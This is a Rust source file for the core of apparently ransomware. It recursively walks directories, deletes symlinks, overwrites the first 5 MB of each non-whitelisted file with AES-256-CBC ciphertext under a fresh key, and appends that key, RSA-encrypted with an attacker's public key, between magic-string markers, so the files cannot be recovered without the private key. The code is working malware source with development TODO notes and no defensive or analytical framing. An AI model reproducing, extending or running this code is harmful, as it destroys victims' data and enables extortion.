use super::aes_keys::Keys;
use crate::crypt::asymmetric::rsa_func::{read_rsa_key, rsa_encrypt_buffer};
use crate::FILESYS;
use libaes::Cipher;
use std::collections::HashSet;
use std::fs;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::{ErrorKind, Read, Result, Seek, SeekFrom, Write};
use std::path::Path;
use zeroize::Zeroize;

/*
    TODO:
    - 1 - done ...
        . fn read_exact_or_eof() in this version of improved_encrypt_file the read_exact
        . may cause an error while reading file shorter or not dobled from buffer_size

    - 2 - done part one ...
        . remove header_size param and depend on just buffer_size
        . make the encryption persistent with 4 steps
            # encrypt all files with content size
            # re encrypt remiming size of file
    - 3 -
        . ensure we are writing the encrypted symmetric key even if the buffer size of
            encrypted content bigger than size of file

    - 4 -
        . writing public key used for encrypt symmetric keys


*/

fn read_exact_or_eof<R: Read + ?Sized>(reader: &mut R, buf: &mut [u8]) -> Result<usize> {
    let mut total_read = 0;
    while total_read < buf.len() {
        match reader.read(&mut buf[total_read..]) {
            Ok(0) => break, // End of file
            Ok(n) => total_read += n,
            Err(e) if e.kind() == ErrorKind::Interrupted => continue, // Retry if interrupted
            Err(e) => return Err(e),                                  // Propagate other errors
        }
    }

    Ok(total_read)
}

fn should_encrypt(obj_path: &str, whitelist: &HashSet<&str>) -> bool {
    let mut result = false;
    if let Some(file) = Path::new(obj_path).file_name() {
        result = whitelist.contains(file.to_str().unwrap());
    }
    !result
}

fn encrypt_content(content: &[u8], keys: &Keys) -> Vec<u8> {
    let cipher = Cipher::new_256(&keys.key);
    cipher.cbc_encrypt(&keys.iv, content)
}

fn overwrite_file_with_encrypted_content(file: &mut File, encrypted_content: &[u8]) -> Result<()> {
    file.seek(SeekFrom::Start(0))?;
    file.set_len(0)?; // Clear file contents
    file.write_all(encrypted_content)?;
    Ok(())
}

fn append_encrypted_key_and_magic_string(
    file: &mut File,
    encrypted_key: &[u8],
    magic_string: &str,
) -> Result<()> {
    file.seek(SeekFrom::End(0))?;
    let footer = [
        magic_string.as_bytes(),
        b"-",
        encrypted_key,
        b"-",
        magic_string.as_bytes(),
    ]
    .concat();
    file.write_all(&footer)?;
    Ok(())
}

// Main encryption function
fn improved_encrypt_file(
    file: &str,
    buffer_size: usize,
    pub_key: &str,
    magic_string: &str,
    whitelist: &HashSet<&str>,
) -> Result<()> {
    if !should_encrypt(file, whitelist) {
        return Ok(());
    }

    let mut file = OpenOptions::new().read(true).write(true).open(file)?;

    let mut content = vec![0; buffer_size];
    file.seek(SeekFrom::Start(0))?;

    let bytes_read = read_exact_or_eof(&mut file, &mut content)?;
    if bytes_read == 0 {
        return Ok(()); // No data to process
    }
    content.truncate(bytes_read);

    let mut keys = Keys::new(); // symmetric key (not RSA)
    let encrypted_content = encrypt_content(&content, &keys);

    overwrite_file_with_encrypted_content(&mut file, &encrypted_content)?;

    let pub_key = read_rsa_key(pub_key)?;
    let encrypted_symmetric_key = rsa_encrypt_buffer(&keys.key, &pub_key)?;

    append_encrypted_key_and_magic_string(&mut file, &encrypted_symmetric_key, magic_string)?;

    content.zeroize();
    keys.key.zeroize();

    Ok(())
}

pub fn normal_encrypt_all_dir(
    dir_path: &str,
    pub_key: &str,
    magic_string: &'static str,
    whitelist: &HashSet<&str>,
    whitelistfile: &HashSet<&str>,
) -> Result<()> {
    if !should_encrypt(dir_path, &whitelist) {
        return Ok(());
    }

    let entries = fs::read_dir(dir_path)?
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .collect::<Vec<_>>();

    for path in entries {
        let metadata = path.symlink_metadata()?;

        if metadata.is_symlink() {
            fs::remove_file(&path).ok(); // Remove symlink if possible, else skip
            continue;
        }

        if metadata.is_dir() {
            normal_encrypt_all_dir(
                &path.display().to_string(),
                pub_key,
                magic_string,
                &whitelist,
                &whitelistfile,
            )?;
        } else if metadata.is_file() {
            improved_encrypt_file(
                &path.to_str().unwrap(),
                5242880,
                pub_key,
                magic_string,
                whitelistfile,
            )?;
        }
    }

    Ok(())
}
